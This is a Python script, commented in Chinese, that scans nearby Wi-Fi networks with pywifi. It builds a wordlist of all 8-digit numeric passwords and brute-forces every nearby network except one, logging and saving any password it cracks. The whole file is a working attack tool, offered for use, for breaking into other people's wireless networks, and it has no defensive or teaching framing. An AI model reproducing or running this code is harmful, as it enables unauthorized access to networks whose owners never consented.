# pip install pywifi
# pip install comtypes
from pywifi import PyWiFi,Profile,const
import time
import itertools as its
import datetime
import pandas as pd
import os

# 配置日志
from loguru import logger # pip install loguru # 这个框架可以解决中文不显示的问题
logger.add(
    sink=f"log.log",#sink: 创建日志文件的路径。
    level="INFO",#level: 记录日志的等级，低于这个等级的日志不会被记录。等级顺序为 debug < info < warning < error。设置 INFO 会让 logger.debug 的输出信息不被写入磁盘。
    rotation="00:00",#rotation: 轮换策略，此处代表每天凌晨创建新的日志文件进行日志 IO；也可以通过设置 "2 MB" 来指定 日志文件达到 2 MB 时进行轮换。   
    retention="7 days",#retention: 只保留 7 天。 
    compression="zip",#compression: 日志文件较大时会采用 zip 进行压缩。
    encoding="utf-8",#encoding: 编码方式
    enqueue=True,#enqueue: 队列 IO 模式，此模式下日志 IO 不会影响 python 主进程，建议开启。
    format="{time:YYYY-MM-DD HH:mm:ss} | {level} | {message}"#format: 定义日志字符串的样式，这个应该都能看懂。
)

#列出周围所有Wi-Fi网络的SSID（网络名称）和信号强度
SSIDdf=pd.DataFrame({})
wifi = PyWiFi()
ifaces = wifi.interfaces()[0]#得到一个无线网卡
# print(ifaces)#需要打开wifi接口才能获取wifi
# # 切断网卡连接
# ifaces.disconnect()
# # 获取wifi的连接状态
# wifistatus = ifaces.status()
SSIDdf=pd.DataFrame({})
ifaces.scan()
time.sleep(1)
results = ifaces.scan_results()
for network in results:
    thisssid=network.ssid.encode('raw_unicode_escape').decode('utf-8')#避免中文乱码问题
    SSIDdf=pd.concat([SSIDdf,pd.DataFrame({"ssid":[thisssid],
                                        "信号强度":[network.signal]})])
    print(network,SSIDdf)
# 按照信号强度降序排序
SSIDdf = SSIDdf.sort_values(by='信号强度', ascending=False)
print(SSIDdf)
SSIDdf.to_csv("SSIDdf.csv")
SSIDdf=pd.read_csv("SSIDdf.csv")
print("wifi详情",SSIDdf)

pwdpath=r"pwd.txt"
# 检查文件是否存在
if os.path.exists(pwdpath):
    print("密码本存在无需生成")
else:
    print("密码本不存在需要生成")
    # 生成简单密码本
    words = '1234567890'#这里可以加入字母和其他字符，使用string包更方便
    # words = '1234567890abcdefghijklmnopqrstuvwxyz'#这里可以加入字母和其他字符，使用string包更方便
    r = its.product(words,repeat=8)#密码位数为9
    dic = open(pwdpath,'a')
    start=datetime.datetime.now()#记录程序启动时间
    for i in r:
        # 后面从44528791往上继续补充
        dic.write(''.join(i))
        dic.write(''.join('\n'))
        print(i)
    dic.close()
    print('密码本生成好了')
    end=datetime.datetime.now()#记录程序结束时间
    print("生成密码本一共用了多长时间：{}".format(end-start))

def connect_wifi(ssid, pwd):#这段代码尝试连接到一个指定的Wi-Fi网络。请将'你的网络名称'和'你的密码'替换为实际的网络名称和密码。
    #断开所有连接
    ifaces.disconnect()
    time.sleep(0.1)
    wifistatus=ifaces.status()
    # if wifistatus==const.IFACE_DISCONNECTED:
    if wifistatus in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]:
        #创建WiFi连接文件
        profile=Profile()
        #要连接WiFi的名称
        profile.ssid=ssid
        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN
        #wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #调用密码
        profile.key=pwd
        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile=ifaces.add_network_profile(profile)
        res=ifaces.connect(tep_profile)
        #wifi连接时间
        while True:
            time.sleep(0.2)  # 减少等待时间，更频繁地检查状态
            if ifaces.status() == const.IFACE_CONNECTED:
                break
            elif ifaces.status() == const.IFACE_DISCONNECTED:
                break
            else:
                pass
                # print("正在尝试连接...")
        if ifaces.status() == const.IFACE_CONNECTED:
            print("连接成功")
            return True
        elif ifaces.status() == const.IFACE_DISCONNECTED:
            print("连接失败")
            return False
        
print("****************** WIFI破解 ******************")

# 生成ssid列表
SSIDdf=SSIDdf.dropna(subset=['ssid'])
ssidlist=SSIDdf["ssid"].tolist()#去重后生成列表，主要避免的重复
# ssidlist=SSIDdf["ssid"].unique().tolist()#去重后生成列表，主要避免的重复
print(ssidlist)    
#抓取网卡接口
wifi=PyWiFi()
#获取第一个无线网卡
ifaces=wifi.interfaces()[0]
for ssid in ssidlist:
    #打开密码本【每次都重新打开密码本】
    pwdfile = open(pwdpath,"r")
    if ssid!="WHZH":
    # if ssid=="WHZH":
    # if ssid=="Tenda_5B1488":
        while True:# 运气好的情况下，几分钟就破解了，如果WI-FI密码设置不复杂，使用最短8位数字，最多也就1亿种可能
            pwd = pwdfile.readline()
            # 去除密码的末尾换行符
            pwd = pwd.strip('\n')
            bool = connect_wifi(ssid, pwd)
            if bool:
                print("[*] 密码已破解：", pwd)
                print("[*] WiFi已自动连接")
                logger.info(ssid+",密码已破解,"+pwd)
                SSIDdf.loc[SSIDdf["ssid"]==ssid,"pwd"]=pwd
                SSIDdf.to_csv("SSIDdf.csv")
                break
            else:
                # 跳出当前循环，进行下一次循环
                print(f"正在破解 SSID 为 {ssid} 的 WIFI密码，当前校验的密码为：{pwd}")
